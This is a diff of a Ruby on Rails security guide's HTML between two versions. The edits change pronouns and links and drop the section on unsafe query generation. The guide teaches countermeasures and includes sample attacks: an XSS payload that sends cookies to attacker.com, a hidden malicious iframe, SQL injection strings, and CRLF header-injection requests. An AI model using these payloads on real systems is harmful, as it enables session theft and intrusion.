     <p>Does the admin really have to access the interface from everywhere in the world? Think about <em>limiting the login to a bunch of source IP addresses</em>. Examine request.remote_ip to find out about the user’s IP address. This is not bullet-proof, but a great barrier. Remember that there might be a proxy in use, though.</p>
@@ -855,7 +444,7 @@ send_file filename, <span style="color:#606">disposition</span>: <span style="ba
 
 <p>There are a number of authentication plug-ins for Rails available. Good ones, such as the popular <a href="https://github.com/plataformatec/devise">devise</a> and <a href="https://github.com/binarylogic/authlogic">authlogic</a>, store only encrypted passwords, not plain-text passwords. In Rails 3.1 you can use the built-in <code>has_secure_password</code> method which has similar features.</p>
 
-<p>Every new user gets an activation code to activate their account when they get an e-mail with a link in it. After activating the account, the activation_code columns will be set to NULL in the database. If someone requested an URL like these, they would be logged in as the first activated user found in the database (and chances are that this is the administrator):</p>
+<p>Every new user gets an activation code to activate his account when he gets an e-mail with a link in it. After activating the account, the activation_code columns will be set to NULL in the database. If someone requested an URL like these, he would be logged in as the first activated user found in the database (and chances are that this is the administrator):</p>
 
 <pre><code>http://localhost:3006/user/activate
 http://localhost:3006/user/activate?id=
@@ -877,7 +466,7 @@ http://localhost:3006/user/activate?id=
 </div>
 </div>
 
-<p>And thus it found the first user in the database, returned it and logged them in. You can find out more about it in <a href="http://www.rorsecurity.info/2007/10/28/restful_authentication-login-security/">this blog post</a>. <em>It is advisable to update your plug-ins from time to time</em>. Moreover, you can review your application to find more flaws like this.</p>
+<p>And thus it found the first user in the database, returned it and logged him in. You can find out more about it in <a href="http://www.rorsecurity.info/2007/10/28/restful_authentication-login-security/">my blog post</a>. <em>It is advisable to update your plug-ins from time to time</em>. Moreover, you can review your application to find more flaws like this.</p>
 
 <h3 id="brute-forcing-accounts">Brute-Forcing Accounts</h3>
 
@@ -897,24 +486,24 @@ http://localhost:3006/user/activate?id=
 
 <h4 id="passwords">Passwords</h4>
 
-<p>Think of a situation where an attacker has stolen a user’s session cookie and thus may co-use the application. If it is easy to change the password, the attacker will hijack the account with a few clicks. Or if the change-password form is vulnerable to CSRF, the attacker will be able to change the victim’s password by luring them to a web page where there is a crafted IMG-tag which does the CSRF. As a countermeasure, <em>make change-password forms safe against CSRF</em>, of course. And <em>require the user to enter the old password when changing it</em>.</p>
+<p>Think of a situation where an attacker has stolen a user’s session cookie and thus may co-use the application. If it is easy to change the password, the attacker will hijack the account with a few clicks. Or if the change-password form is vulnerable to CSRF, the attacker will be able to change the victim’s password by luring him to a web page where there is a crafted IMG-tag which does the CSRF. As a countermeasure, <em>make change-password forms safe against CSRF</em>, of course. And <em>require the user to enter the old password when changing it</em>.</p>
 
 <h4 id="e-mail">E-Mail</h4>
 
-<p>However, the attacker may also take over the account by changing the e-mail address. After they change it, they will go to the forgotten-password page and the (possibly new) password will be mailed to the attacker’s e-mail address. As a countermeasure <em>require the user to enter the password when changing the e-mail address, too</em>.</p>
+<p>However, the attacker may also take over the account by changing the e-mail address. After he changed it, he will go to the forgotten-password page and the (possibly new) password will be mailed to the attacker’s e-mail address. As a countermeasure <em>require the user to enter the password when changing the e-mail address, too</em>.</p>
 
 <h4 id="other">Other</h4>
 
-<p>Depending on your web application, there may be more ways to hijack the user’s account. In many cases CSRF and XSS will help to do so. For example, as in a CSRF vulnerability in <a href="http://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/">Google Mail</a>. In this proof-of-concept attack, the victim would have been lured to a web site controlled by the attacker. On that site is a crafted IMG-tag which results in a HTTP GET request that changes the filter settings of Google Mail. If the victim was logged in to Google Mail, the attacker would change the filters to forward all e-mails to their e-mail address. This is nearly as harmful as hijacking the entire account. As a countermeasure, <em>review your application logic and eliminate all XSS and CSRF vulnerabilities</em>.</p>
+<p>Depending on your web application, there may be more ways to hijack the user’s account. In many cases CSRF and XSS will help to do so. For example, as in a CSRF vulnerability in <a href="http://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/">Google Mail</a>. In this proof-of-concept attack, the victim would have been lured to a web site controlled by the attacker. On that site is a crafted IMG-tag which results in a HTTP GET request that changes the filter settings of Google Mail. If the victim was logged in to Google Mail, the attacker would change the filters to forward all e-mails to his e-mail address. This is nearly as harmful as hijacking the entire account. As a countermeasure, <em>review your application logic and eliminate all XSS and CSRF vulnerabilities</em>.</p>
 
 <h3 id="captchas">CAPTCHAs</h3>
 
-<p>INFO: <em>A CAPTCHA is a challenge-response test to determine that the response is not generated by a computer. It is often used to protect comment forms from automatic spam bots by asking the user to type the letters of a distorted image. The idea of a negative CAPTCHA is not for a user to prove that they are human, but reveal that a robot is a robot.</em></p>
+<p>INFO: <em>A CAPTCHA is a challenge-response test to determine that the response is not generated by a computer. It is often used to protect comment forms from automatic spam bots by asking the user to type the letters of a distorted image. The idea of a negative CAPTCHA is not for a user to prove that he is human, but reveal that a robot is a robot.</em></p>
 
 <p>But not only spam robots (bots) are a problem, but also automatic login bots. A popular CAPTCHA API is <a href="http://recaptcha.net/">reCAPTCHA</a> which displays two distorted images of words from old books. It also adds an angled line, rather than a distorted background and high levels of warping on the text as earlier CAPTCHAs did, because the latter were broken. As a bonus, using reCAPTCHA helps to digitize old books. <a href="https://github.com/ambethia/recaptcha/">ReCAPTCHA</a> is also a Rails plug-in with the same name as the API.</p>
 
 <p>You will get two keys from the API, a public and a private key, which you have to put into your Rails environment. After that you can use the recaptcha_tags method in the view, and the verify_recaptcha method in the controller. Verify_recaptcha will return false if the validation fails.
-The problem with CAPTCHAs is, they are annoying. Additionally, some visually impaired users have found certain kinds of distorted CAPTCHAs difficult to read. The idea of negative CAPTCHAs is not to ask a user to proof that they are human, but reveal that a spam robot is a bot.</p>
+The problem with CAPTCHAs is, they are annoying. Additionally, some visually impaired users have found certain kinds of distorted CAPTCHAs difficult to read. The idea of negative CAPTCHAs is not to ask a user to proof that he is human, but reveal that a spam robot is a bot.</p>
 
 <p>Most bots are really dumb, they crawl the web and put their spam into every form’s field they can find. Negative CAPTCHAs take advantage of that and include a “honeypot” field in the form which will be hidden from the human user by CSS or JavaScript.</p>
 
@@ -928,7 +517,7 @@ The problem with CAPTCHAs is, they are annoying. Additionally, some visually imp
 
 <p>The most simple negative CAPTCHA is one hidden honeypot field. On the server side, you will check the value of the field: If it contains any text, it must be a bot. Then, you can either ignore the post or return a positive result, but not saving the post to the database. This way the bot will be satisfied and moves on. You can do this with annoying users, too.</p>
 
-<p>You can find more sophisticated negative CAPTCHAs in Ned Batchelder’s <a href="http://nedbatchelder.com/text/stopbots.html">blog post</a>:</p>
+<p>You can find more sophisticated negative CAPTCHAs in Ned Batchelder’s <a href="http://nedbatchelder.com/text/stopbots.html:">blog post</a></p>
 
 <ul>
   <li>Include a field with the current UTC time-stamp in it and check it on the server. If it is too far in the past, or if it is in the future, the form is invalid.</li>
@@ -966,7 +555,7 @@ The problem with CAPTCHAs is, they are annoying. Additionally, some visually imp
 
 <p>INFO: <em>A common pitfall in Ruby’s regular expressions is to match the string’s beginning and end by ^ and $, instead of \A and \z.</em></p>
 
-<p>Ruby uses a slightly different approach than many other languages to match the end and the beginning of a string. That is why even many Ruby and Rails books get this wrong. So how is this a security threat? Say you wanted to loosely validate a URL field and you used a simple regular expression like this:</p>
+<p>Ruby uses a slightly different approach than many other languages to match the end and the beginning of a string. That is why even many Ruby and Rails books make this wrong. So how is this a security threat? Say you wanted to loosely validate a URL field and you used a simple regular expression like this:</p>
 
 <div class="highlighter-coderay"><div class="CodeRay">
   <div class="code"><pre>  <span style="background-color:hsla(300,100%,50%,0.06)"><span style="color:#404">/</span><span style="color:#808">^https?:</span><span style="color:#D20">\/</span><span style="color:#D20">\/</span><span style="color:#808">[^</span><span style="color:#D20">\n</span><span style="color:#808">]+$</span><span style="color:#404">/</span><span style="color:#C2C">i</span></span>
@@ -981,7 +570,7 @@ http://hi.com
 */
 </code></pre>
 
-<p>This URL passes the filter because the regular expression matches - the second line, the rest does not matter. Now imagine we had a view that showed the URL like this:</p>
+<p>This URL passes the filter because the regular expression matches – the second line, the rest does not matter. Now imagine we had a view that showed the URL like this:</p>
 
 <div class="highlighter-coderay"><div class="CodeRay">
   <div class="code"><pre>  link_to <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">Homepage</span><span style="color:#710">&quot;</span></span>, <span style="color:#33B">@user</span>.homepage
@@ -1022,7 +611,7 @@ http://hi.com
 </div>
 </div>
 
-<p>This is alright for some web applications, but certainly not if the user is not authorized to view all projects. If the user changes the id to 42, and they are not allowed to see that information, they will have access to it anyway. Instead, <em>query the user’s access rights, too</em>:</p>
+<p>This is alright for some web applications, but certainly not if the user is not authorized to view all projects. If the user changes the id to 42, and he is not allowed to see that information, he will have access to it anyway. Instead, <em>query the user’s access rights, too</em>:</p>
 
 <div class="highlighter-coderay"><div class="CodeRay">
   <div class="code"><pre><span style="color:#33B">@project</span> = <span style="color:#33B">@current_user</span>.projects.find(params[<span style="color:#A60">:id</span>])
@@ -1042,7 +631,7 @@ http://hi.com
 
 <h3 id="whitelists-versus-blacklists">Whitelists versus Blacklists</h3>
 
-<p>NOTE: <em>When sanitizing, protecting or verifying something, prefer whitelists over blacklists.</em></p>
+<p>NOTE: <em>When sanitizing, protecting or verifying something, whitelists over blacklists.</em></p>
 
 <p>A blacklist can be a list of bad e-mail addresses, non-public actions or bad HTML tags. This is opposed to a whitelist which lists the good e-mail addresses, public actions, good HTML tags and so on. Although sometimes it is not possible to create a whitelist (in a SPAM filter, for example), <em>prefer to use whitelist approaches</em>:</p>
 
@@ -1073,7 +662,7 @@ http://hi.com
 </div>
 </div>
 
-<p>This could be in a search action and the user may enter a project’s name that they want to find. If a malicious user enters ‘ OR 1 –, the resulting SQL query will be:</p>
+<p>This could be in a search action and the user may enter a project’s name that he wants to find. If a malicious user enters ‘ OR 1 –, the resulting SQL query will be:</p>
 
 <div class="highlighter-coderay"><div class="CodeRay">
   <div class="code"><pre><span style="color:#B06;font-weight:bold">SELECT</span> * <span style="color:#080;font-weight:bold">FROM</span> projects <span style="color:#080;font-weight:bold">WHERE</span> name = <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">'</span><span style="color:#710">'</span></span> <span style="color:#080;font-weight:bold">OR</span> <span style="color:#00D">1</span> <span style="color:#777">--'</span>
@@ -1085,7 +674,7 @@ http://hi.com
 
 <h4 id="bypassing-authorization">Bypassing Authorization</h4>
 
-<p>Usually a web application includes access control. The user enters their login credentials and the web application tries to find the matching record in the users table. The application grants access when it finds a record. However, an attacker may possibly bypass this check with SQL injection. The following shows a typical database query in Rails to find the first record in the users table which matches the login credentials parameters supplied by the user.</p>
+<p>Usually a web application includes access control. The user enters his login credentials, the web application tries to find the matching record in the users table. The application grants access when it finds a record. However, an attacker may possibly bypass this check with SQL injection. The following shows a typical database query in Rails to find the first record in the users table which matches the login credentials parameters supplied by the user.</p>
 
 <div class="highlighter-coderay"><div class="CodeRay">
   <div class="code"><pre><span style="color:#036;font-weight:bold">User</span>.first(<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">login = '</span><span style="background-color:hsla(0,0%,0%,0.07);color:black"><span style="font-weight:bold;color:#666">#{</span>params[<span style="color:#A60">:name</span>]<span style="font-weight:bold;color:#666">}</span></span><span style="color:#D20">' AND password = '</span><span style="background-color:hsla(0,0%,0%,0.07);color:black"><span style="font-weight:bold;color:#666">#{</span>params[<span style="color:#A60">:password</span>]<span style="font-weight:bold;color:#666">}</span></span><span style="color:#D20">'</span><span style="color:#710">&quot;</span></span>)
@@ -1133,7 +722,7 @@ http://hi.com
 
 <h4 id="countermeasures">Countermeasures</h4>
 
-<p>Ruby on Rails has a built-in filter for special SQL characters, which will escape ‘ , “ , NULL character and line breaks. <em>Using <code>Model.find(id)</code> or <code>Model.find_by_some thing(something)</code> automatically applies this countermeasure</em>. But in SQL fragments, especially <em>in conditions fragments (<code>where("...")</code>), the <code>connection.execute()</code> or <code>Model.find_by_sql()</code> methods, it has to be applied manually</em>.</p>
+<p>Ruby on Rails has a built-in filter for special SQL characters, which will escape ‘ , “ , NULL character and line breaks. <em class="highlight">Using <code>Model.find(id)</code> or <code>Model.find_by_some thing(something)</code> automatically applies this countermeasure</em>. But in SQL fragments, especially <em class="highlight">in conditions fragments (<code>where("...")</code>), the <code>connection.execute()</code> or <code>Model.find_by_sql()</code> methods, it has to be applied manually</em>.</p>
 
 <p>Instead of passing a string to the conditions option, you can pass an array to sanitize tainted strings like this:</p>
 
@@ -1161,7 +750,7 @@ http://hi.com
 
 <p>An entry point is a vulnerable URL and its parameters where an attacker can start an attack.</p>
 
-<p>The most common entry points are message posts, user comments, and guest books, but project titles, document names and search result pages have also been vulnerable - just about everywhere where the user can input data. But the input does not necessarily have to come from input boxes on web sites, it can be in any URL parameter - obvious, hidden or internal. Remember that the user may intercept any traffic. Applications, such as the <a href="http://livehttpheaders.mozdev.org/">Live HTTP Headers Firefox plugin</a>, or client-site proxies make it easy to change requests.</p>
+<p>The most common entry points are message posts, user comments, and guest books, but project titles, document names and search result pages have also been vulnerable - just about everywhere where the user can input data. But the input does not necessarily have to come from input boxes on web sites, it can be in any URL parameter – obvious, hidden or internal. Remember that the user may intercept any traffic. Applications, such as the <a href="http://livehttpheaders.mozdev.org/">Live HTTP Headers Firefox plugin</a>, or client-site proxies make it easy to change requests.</p>
 
 <p>XSS attacks work like this: An attacker injects some code, the web application saves it and displays it on a page, later presented to a victim. Most XSS examples simply display an alert box, but it is more powerful than that. XSS can steal the cookie, hijack the session, redirect the victim to a fake website, display advertisements for the benefit of the attacker, change elements on the web site to get confidential information or install malicious software through security holes in the web browser.</p>
 
@@ -1197,7 +786,7 @@ http://hi.com
 <pre><code>&lt;script&gt;document.write(document.cookie);&lt;/script&gt;
 </code></pre>
 
-<p>For an attacker, of course, this is not useful, as the victim will see their own cookie. The next example will try to load an image from the URL http://www.attacker.com/ plus the cookie. Of course this URL does not exist, so the browser displays nothing. But the attacker can review their web server’s access log files to see the victim’s cookie.</p>
+<p>For an attacker, of course, this is not useful, as the victim will see his own cookie. The next example will try to load an image from the URL http://www.attacker.com/ plus the cookie. Of course this URL does not exist, so the browser displays nothing. But the attacker can review his web server’s access log files to see the victim’s cookie.</p>
 
 <div class="highlighter-coderay"><div class="CodeRay">
   <div class="code"><pre><span style="color:#070;font-weight:bold">&lt;script&gt;</span><span style="background-color:hsla(0,0%,0%,0.07);color:black">document.write(<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">'</span><span style="color:#D20">&lt;img src=&quot;http://www.attacker.com/</span><span style="color:#710">'</span></span> + document.cookie + <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">'</span><span style="color:#D20">&quot;&gt;</span><span style="color:#710">'</span></span>);</span><span style="color:#070;font-weight:bold">&lt;/script&gt;</span>
@@ -1217,12 +806,12 @@ http://hi.com
 <p>With web page defacement an attacker can do a lot of things, for example, present false information or lure the victim on the attackers web site to steal the cookie, login credentials or other sensitive data. The most popular way is to include code from external sources by iframes:</p>
 
 <div class="highlighter-coderay"><div class="CodeRay">
-  <div class="code"><pre><span style="color:#070;font-weight:bold">&lt;iframe</span> <span style="color:#b48">name</span>=<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">StatPage</span><span style="color:#710">&quot;</span></span> <span style="color:#b48">src</span>=<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">http://58.xx.xxx.xxx</span><span style="color:#710">&quot;</span></span> <span style="color:#b48">width</span>=<span style="color:#700">5</span> <span style="color:#b48">height</span>=<span style="color:#700">5</span> <span style="color:#b48">style</span>=<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#606">display</span>:<span style="color:#088">none</span><span style="color:#710">&quot;</span></span><span style="color:#070;font-weight:bold">&gt;</span><span style="color:#070;font-weight:bold">&lt;/iframe&gt;</span>
+  <div class="code"><pre><span style="color:#070;font-weight:bold">&lt;iframe</span> <span style="color:#b48">name</span>=<span style="color:#F00;background-color:#FAA">”</span><span style="color:#700">StatPage</span><span style="color:#F00;background-color:#FAA">”</span> <span style="color:#b48">src</span>=<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">http://58.xx.xxx.xxx</span><span style="color:#710">&quot;</span></span> <span style="color:#b48">width</span>=<span style="color:#700">5</span> <span style="color:#b48">height</span>=<span style="color:#700">5</span> <span style="color:#b48">style</span>=<span style="color:#F00;background-color:#FAA">”</span><span style="color:#700">display:none</span><span style="color:#F00;background-color:#FAA">”</span><span style="color:#070;font-weight:bold">&gt;</span><span style="color:#070;font-weight:bold">&lt;/iframe&gt;</span>
 </pre></div>
 </div>
 </div>
 
-<p>This loads arbitrary HTML and/or JavaScript from an external source and embeds it as part of the site. This iframe is taken from an actual attack on legitimate Italian sites using the <a href="http://isc.sans.org/diary.html?storyid=3015">Mpack attack framework</a>. Mpack tries to install malicious software through security holes in the web browser - very successfully, 50% of the attacks succeed.</p>
+<p>This loads arbitrary HTML and/or JavaScript from an external source and embeds it as part of the site. This iframe is taken from an actual attack on legitimate Italian sites using the <a href="http://isc.sans.org/diary.html?storyid=3015">Mpack attack framework</a>. Mpack tries to install malicious software through security holes in the web browser – very successfully, 50% of the attacks succeed.</p>
 
 <p>A more specialized attack could overlap the entire web site or display a login form, which looks the same as the site’s original, but transmits the user name and password to the attacker’s site. Or it could use CSS and/or JavaScript to hide a legitimate link in the web application, and display another one at its place which redirects to a fake web site.</p>
 
@@ -1246,7 +835,7 @@ http://hi.com
 </div>
 </div>
 
-<p>This returned “some&lt;script&gt;alert(‘hello’)&lt;/script&gt;”, which makes an attack work. That’s why a whitelist approach is better, using the updated Rails 2 method sanitize():</p>
+<p>This returned “some&lt;script&gt;alert(‘hello’)&lt;/script&gt;”, which makes an attack work. That’s why I vote for a whitelist approach, using the updated Rails 2 method sanitize():</p>
 
 <div class="highlighter-coderay"><div class="CodeRay">
   <div class="code"><pre>tags = <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">%w(</span><span style="color:#D20">a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p</span><span style="color:#710">)</span></span>
@@ -1257,7 +846,7 @@ s = sanitize(user_input, <span style="color:#606">tags</span>: tags, <span style
 
 <p>This allows only the given tags and does a good job, even against all kinds of tricks and malformed tags.</p>
 
-<p>As a second step, <em>it is good practice to escape all output of the application</em>, especially when re-displaying user input, which hasn’t been input-filtered (as in the search form example earlier on). <em>Use <code>escapeHTML()</code> (or its alias <code>h()</code>) method</em> to replace the HTML input characters &amp;, ", &lt;, &gt; by their uninterpreted representations in HTML (<code>&amp;amp;</code>, <code>&amp;quot;</code>, <code>&amp;lt</code>;, and <code>&amp;gt;</code>). However, it can easily happen that the programmer forgets to use it, so _it is recommended to use the SafeErb gem. SafeErb reminds you to escape strings from external sources.</p>
+<p>As a second step, <em>it is good practice to escape all output of the application</em>, especially when re-displaying user input, which hasn’t been input-filtered (as in the search form example earlier on). <em>Use <code>escapeHTML()</code> (or its alias <code>h()</code>) method</em> to replace the HTML input characters &amp;, ", &lt;, &gt; by their uninterpreted representations in HTML (<code>&amp;amp;</code>, <code>&amp;quot;</code>, <code>&amp;lt</code>;, and <code>&amp;gt;</code>). However, it can easily happen that the programmer forgets to use it, so <em>it is recommended to use the <a href="http://safe-erb.rubyforge.org/svn/plugins/safe_erb/">SafeErb</a> plugin</em>. SafeErb reminds you to escape strings from external sources.</p>
 
 <h5 id="obfuscation-and-encoding-injection">Obfuscation and Encoding Injection</h5>
 
@@ -1282,7 +871,7 @@ s = sanitize(user_input, <span style="color:#606">tags</span>: tags, <span style
 
 <p>The worms exploits a hole in Yahoo’s HTML/JavaScript filter, which usually filters all target and onload attributes from tags (because there can be JavaScript). The filter is applied only once, however, so the onload attribute with the worm code stays in place. This is a good example why blacklist filters are never complete and why it is hard to allow HTML/JavaScript in a web application.</p>
 
-<p>Another proof-of-concept webmail worm is Nduja, a cross-domain worm for four Italian webmail services. Find more details on <a href="http://www.xssed.com/news/37/Nduja_Connection_A_cross_webmail_worm_XWW/">Rosario Valotta’s paper</a>. Both webmail worms have the goal to harvest email addresses, something a criminal hacker could make money with.</p>
+<p>Another proof-of-concept webmail worm is Nduja, a cross-domain worm for four Italian webmail services. Find more details on <a href="http://www.xssed.com/article/9/Paper_A_PoC_of_a_cross_webmail_worm_XWW_called_Njuda_connection/">Rosario Valotta’s paper</a>. Both webmail worms have the goal to harvest email addresses, something a criminal hacker could make money with.</p>
 
 <p>In December 2006, 34,000 actual user names and passwords were stolen in a <a href="http://news.netcraft.com/archives/2006/10/27/myspace_accounts_compromised_by_phishers.html">MySpace phishing attack</a>. The idea of the attack was to create a profile page named “login_home_index_html”, so the URL looked very convincing. Specially-crafted HTML and CSS was used to hide the genuine MySpace content from the page and instead display its own login form.</p>
 
@@ -1331,7 +920,7 @@ s = sanitize(user_input, <span style="color:#606">tags</span>: tags, <span style
 
 <h4 id="countermeasures-2">Countermeasures</h4>
 
-<p>This example, again, showed that a blacklist filter is never complete. However, as custom CSS in web applications is a quite rare feature, it may be hard to find a good whitelist CSS filter. <em>If you want to allow custom colors or images, you can allow the user to choose them and build the CSS in the web application</em>. Use Rails’ <code>sanitize()</code> method as a model for a whitelist CSS filter, if you really need one.</p>
+<p>This example, again, showed that a blacklist filter is never complete. However, as custom CSS in web applications is a quite rare feature, I am not aware of a whitelist CSS filter. <em>If you want to allow custom colors or images, you can allow the user to choose them and build the CSS in the web application</em>. Use Rails’ <code>sanitize()</code> method as a model for a whitelist CSS filter, if you really need one.</p>
 
 <h3 id="textile-injection">Textile Injection</h3>
 
@@ -1372,7 +961,7 @@ s = sanitize(user_input, <span style="color:#606">tags</span>: tags, <span style
 
 <p>NOTE: <em>The same security precautions have to be taken for Ajax actions as for “normal” ones. There is at least one exception, however: The output has to be escaped in the controller already, if the action doesn’t render a view.</em></p>
 
-<p>If you use the <a href="https://rubygems.org/gems/in_place_editing">in_place_editor plugin</a>, or actions that return a string, rather than rendering a view, <em>you have to escape the return value in the action</em>. Otherwise, if the return value contains a XSS string, the malicious code will be executed upon return to the browser. Escape any input value using the h() method.</p>
+<p>If you use the <a href="http://dev.rubyonrails.org/browser/plugins/in_place_editing">in_place_editor plugin</a>, or actions that return a string, rather than rendering a view, <em>you have to escape the return value in the action</em>. Otherwise, if the return value contains a XSS string, the malicious code will be executed upon return to the browser. Escape any input value using the h() method.</p>
 
 <h3 id="command-line-injection">Command Line Injection</h3>
 
@@ -1402,7 +991,7 @@ s = sanitize(user_input, <span style="color:#606">tags</span>: tags, <span style
 
 <p>HTTP request headers have a Referer, User-Agent (client software), and Cookie field, among others. Response headers for example have a status code, Cookie and Location (redirection target URL) field. All of them are user-supplied and may be manipulated with more or less effort. <em>Remember to escape these header fields, too.</em> For example when you display the user agent in an administration area.</p>
 
-<p>Besides that, it is <em>important to know what you are doing when building response headers partly based on user input.</em> For example you want to redirect the user back to a specific page. To do that you introduced a “referer” field in a form to redirect to the given address:</p>
+<p>Besides that, it is <em>important to know what you are doing when building response headers partly based on user input.</em> For example you want to redirect the user back to a specific page. To do that you introduced a “referer“ field in a form to redirect to the given address:</p>
 
 <div class="highlighter-coderay"><div class="CodeRay">
   <div class="code"><pre>redirect_to params[<span style="color:#A60">:referer</span>]
@@ -1428,7 +1017,7 @@ http://www.yourapplication.com/controller/action?referer=path/at/your/app%0d%0aL
 Location: http://www.malicious.tld
 </code></pre>
 
-<p>So <em>attack vectors for Header Injection are based on the injection of CRLF characters in a header field.</em> And what could an attacker do with a false redirection? They could redirect to a phishing site that looks the same as yours, but ask to login again (and sends the login credentials to the attacker). Or they could install malicious software through browser security holes on that site. Rails 2.1.2 escapes these characters for the Location field in the <code>redirect_to</code> method. <em>Make sure you do it yourself when you build other header fields with user input.</em></p>
+<p>So <em>attack vectors for Header Injection are based on the injection of CRLF characters in a header field.</em> And what could an attacker do with a false redirection? He could redirect to a phishing site that looks the same as yours, but asks to login again (and sends the login credentials to the attacker). Or he could install malicious software through browser security holes on that site. Rails 2.1.2 escapes these characters for the Location field in the <code>redirect_to</code> method. <em>Make sure you do it yourself when you build other header fields with user input.</em></p>
 
 <h4 id="response-splitting">Response Splitting</h4>
 
@@ -1451,76 +1040,6 @@ Content-Type: text/html
 </code></pre>
 
 <p>Under certain circumstances this would present the malicious HTML to the victim. However, this only seems to work with Keep-Alive connections (and many browsers are using one-time connections). But you can’t rely on this. <em>In any case this is a serious bug, and you should update your Rails to version 2.0.5 or 2.1.2 to eliminate Header Injection (and thus response splitting) risks.</em></p>
-
-<h2 id="unsafe-query-generation">Unsafe Query Generation</h2>
-
-<p>Due to the way Active Record interprets parameters in combination with the way
-that Rack parses query parameters it was possible to issue unexpected database
-queries with <code>IS NULL</code> where clauses. As a response to that security issue
-(<a href="https://groups.google.com/forum/#!searchin/rubyonrails-security/deep_munge/rubyonrails-security/8SA-M3as7A8/Mr9fi9X4kNgJ">CVE-2012-2660</a>,
-<a href="https://groups.google.com/forum/#!searchin/rubyonrails-security/deep_munge/rubyonrails-security/jILZ34tAHF4/7x0hLH-o0-IJ">CVE-2012-2694</a>
-and <a href="https://groups.google.com/forum/#!searchin/rubyonrails-security/CVE-2012-2660/rubyonrails-security/c7jT-EeN9eI/L0u4e87zYGMJ">CVE-2013-0155</a>)
-<code>deep_munge</code> method was introduced as a solution to keep Rails secure by default.</p>
-
-<p>Example of vulnerable code that could be used by attacker, if <code>deep_munge</code>
-wasn’t performed is:</p>
-
-<div class="highlighter-coderay"><div class="CodeRay">
-  <div class="code"><pre><span style="color:#080;font-weight:bold">unless</span> params[<span style="color:#A60">:token</span>].nil?
-  user = <span style="color:#036;font-weight:bold">User</span>.find_by_token(params[<span style="color:#A60">:token</span>])
-  user.reset_password!
-<span style="color:#080;font-weight:bold">end</span>
-</pre></div>
-</div>
-</div>
-
-<p>When <code>params[:token]</code> is one of: <code>[]</code>, <code>[nil]</code>, <code>[nil, nil, ...]</code> or
-<code>['foo', nil]</code> it will bypass the test for <code>nil</code>, but <code>IS NULL</code> or
-<code>IN ('foo', NULL)</code> where clauses still will be added to the SQL query.</p>
-
-<p>To keep rails secure by default, <code>deep_munge</code> replaces some of the values with
-<code>nil</code>. Below table shows what the parameters look like based on <code>JSON</code> sent in
-request:</p>
-
-<table>
-  <thead>
-    <tr>
-      <th>JSON</th>
-      <th>Parameters</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td><code>{ "person": null }</code></td>
-      <td><code>{ :person =&gt; nil }</code></td>
-    </tr>
-    <tr>
-      <td><code>{ "person": [] }</code></td>
-      <td><code>{ :person =&gt; nil }</code></td>
-    </tr>
-    <tr>
-      <td><code>{ "person": [null] }</code></td>
-      <td><code>{ :person =&gt; nil }</code></td>
-    </tr>
-    <tr>
-      <td><code>{ "person": [null, null, ...] }</code></td>
-      <td><code>{ :person =&gt; nil }</code></td>
-    </tr>
-    <tr>
-      <td><code>{ "person": ["foo", null] }</code></td>
-      <td><code>{ :person =&gt; ["foo"] }</code></td>
-    </tr>
-  </tbody>
-</table>
-
-<p>It is possible to return to old behaviour and disable <code>deep_munge</code> configuring
-your application if you are aware of the risk and know how to handle it:</p>
-
-<div class="highlighter-coderay"><div class="CodeRay">
-  <div class="code"><pre>config.action_dispatch.perform_deep_munge = <span style="color:#069">false</span>
-</pre></div>
-</div>
-</div>
 
 <h2 id="default-headers">Default Headers</h2>
 
@@ -1555,7 +1074,7 @@ your application if you are aware of the risk and know how to handle it:</p>
 </div>
 </div>
 
-<p>Here is a list of common headers:</p>
+<p>Here is the list of common headers:</p>
 
 <ul>
   <li>X-Frame-Options
@@ -1565,7 +1084,7 @@ your application if you are aware of the risk and know how to handle it:</p>
   <li>X-Content-Type-Options
 <em>‘nosniff’ in Rails by default</em> - stops the browser from guessing the MIME type of a file.</li>
   <li>X-Content-Security-Policy
-<a href="http://w3c.github.io/webappsec/specs/content-security-policy/csp-specification.dev.html">A powerful mechanism for controlling which sites certain content types can be loaded from</a></li>
+<a href="http://dvcs.w3.org/hg/content-security-policy/raw-file/tip/csp-specification.dev.html">A powerful mechanism for controlling which sites certain content types can be loaded from</a></li>
   <li>Access-Control-Allow-Origin
 Used to control which sites are allowed to bypass same origin policies and send cross-origin requests.</li>
   <li>Strict-Transport-Security
@@ -1574,7 +1093,7 @@ Used to control which sites are allowed to bypass same origin policies and send 
 
 <h2 id="environmental-security">Environmental Security</h2>
 
-<p>It is beyond the scope of this guide to inform you on how to secure your application code and environments. However, please secure your database configuration, e.g. <code>config/database.yml</code>, and your server-side secret, e.g. stored in <code>config/secrets.yml</code>. You may want to further restrict access, using environment-specific versions of these files and any others that may contain sensitive information.</p>
+<p>It is beyond the scope of this guide to inform you on how to secure your application code and environments. However, please secure your database configuration, e.g. <code>config/database.yml</code>, and your server-side secret, e.g. stored in <code>config/initializers/secret_token.rb</code>. You may want to further restrict access, using environment-specific versions of these files and any others that may contain sensitive information.</p>
 
 <h2 id="additional-resources">Additional Resources</h2>
 
@@ -1587,6 +1106,6 @@ Used to control which sites are allowed to bypass same origin policies and send 
   <li>A <a href="http://ha.ckers.org/blog/">good security blog</a> including the <a href="http://ha.ckers.org/xss.html">Cross-Site scripting Cheat Sheet</a></li>
 </ul>
 
-  </div>
-</body>
+    </div>
+  </body>
 </html>
